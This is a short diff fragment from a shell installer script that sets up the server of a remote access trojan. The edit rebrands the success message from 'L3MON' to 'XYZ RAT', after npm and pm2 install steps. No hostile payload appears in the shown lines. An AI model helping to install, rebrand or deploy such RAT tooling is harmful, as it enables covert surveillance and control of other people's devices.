@@ -95,7 +95,7 @@ cd $PREFIX/share/XYZ RAT/server
 npm install -g npm@6.14.10
 npm install pm2 -g
 npm install
-printf "${Green}[✓] L3MON Installed Sucessful${clear}\n" | pv -qL 30
+printf "${Green}[✓] XYZ RAT Sucessful${clear}\n" | pv -qL 30
 
 
 #############################################################
